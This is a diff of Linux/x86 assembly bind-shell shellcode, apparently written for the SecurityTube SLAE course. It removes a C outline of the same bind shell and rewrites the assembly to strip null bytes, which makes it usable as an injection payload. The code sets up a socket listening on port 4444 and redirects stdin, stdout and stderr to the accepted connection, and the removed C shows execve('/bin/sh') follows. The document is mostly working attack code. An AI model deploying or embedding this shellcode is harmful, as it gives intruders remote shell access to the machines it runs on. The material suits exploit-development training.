@@ -1,82 +1,73 @@
-;int main() {
-;  int s, c;
-;  unsigned short port = 4444;
-;  struct sockaddr_in addr;
-;
-;  s = socket(AF_INET, SOCK_STREAM, 0);
-;
-;  addr.sin_family = AF_INET;
-;  addr.sin_port = htons(port);
-;  addr.sin_addr.s_addr = INADDR_ANY;
-;
-;  bind(s, (struct sockaddr*)&addr, sizeof(addr));
-;  listen(s, 0);
-;
-;  c = accept(s, NULL, NULL);
-;
-;  dup2(c, STDERR_FILENO);
-;  dup2(c, STDOUT_FILENO);
-;  dup2(c, STDIN_FILENO);
-;
-;  execve("/bin/sh", NULL, NULL);
-;
-;  return 0;
-;}
+; Linux/x86 bindshell shellcode
+; By Daniel Roberson -- @dmfroberson -- daniel@planethacker.net
+; 
+; For SecurityTube Linux Assembly Expert course.
+; SLAE-877
 
 BITS 32
 
-PORT equ 44444                 ; port to bind to
+;
+; Port number. In network byte order.
+; python -c "print hex(4444)", reverse order of hex bytes
+;
+PORT equ 0x5c11                ; port to bind to
 
+xor eax, eax                   ; zero out eax register
 xor ebx, ebx                   ; zero out ebx register
 xor edx, edx                   ; zero out ebx register
 
-mov eax, 102                   ; socketcall()
-mov ebx, 1                     ; socket()
+add eax, 102                   ; socketcall() -- changed to add to get rid of null byte
+inc ebx                        ; socket()      -- changed to inc to get rid of null byte
 push edx                       ; protocol. 0 = IP
 push 1                         ; SOCK_STREAM
 push 2                         ; AF_INET
 mov ecx, esp                   ; array of arguments for socket()
-int 0x80
+int 0x80                       ; call socket()
 
 mov esi, eax                   ; move fd for socket into esi
 
-mov eax, 102                   ; socketcall()
-mov ebx, 2                     ; bind()
+xor eax, eax                   ; zero out eax
+add eax, 102                   ; socketcall() -- got rid of the null byte
+inc ebx                        ; bind()
 push edx                       ; INADDR_ANY
 
-mov ecx, PORT
+mov cx, PORT                   ; use cx rather than ecx to remove two null bytes
 push cx
 
-;push word PORT                 ; port
 push word 2                    ; AF_INET
-mov ecx, esp                   ;
-push 16                        ;
-push ecx                       ;
+mov ecx, esp                   ; bind() args
+push 16                        ; size
+push ecx                       ; fd
 push esi                       ; socket fd
 mov ecx, esp                   ; call bind()
 int 0x80
 
-mov eax, 102                   ; socketcall()
-mov ebx, 4                     ; listen()
+xor eax, eax                   ; zero out eax
+add eax, 102                   ; socketcall() -- changed to add to remove null byte
+xor ebx, ebx                   ; zero out ebx
+add ebx, 4                     ; listen()     -- changed to add to remove null byte
 push edx                       ; backlog = 0
 push esi                       ; socket fd
 mov ecx, esp                   ; listen arguments
 int 0x80                       ; call listen()
 
-mov eax, 102                   ; socketcall()
-mov ebx, 5                     ; accept()
+xor eax, eax                   ; zero out eax 
+add eax, 102                   ; socketcall() -- changed to add to remove null byte
+xor ebx, ebx                   ; zero out ebx
+add ebx, 5                     ; accept()  -- changed to add to remove null byte
 push edx                       ; zero addrlen
 push edx                       ; null sockaddr
 push esi                       ; sockfd
 mov ecx, esp                   ; accept() arguments
 int 0x80                       ; call socketcall()
  
-xchg ebx, eax
+xchg ebx, eax                  ; 
  
 xor ecx, ecx                   ; zero out ecx
 mov cl, 2                      ; initialize counter
 loop:
-    mov eax, 63                ; dup2()
+    xor eax, eax
+    add eax, 63                ; dup2()
     int 0x80
     dec ecx                    ; decrease counter
     jns loop                   ;
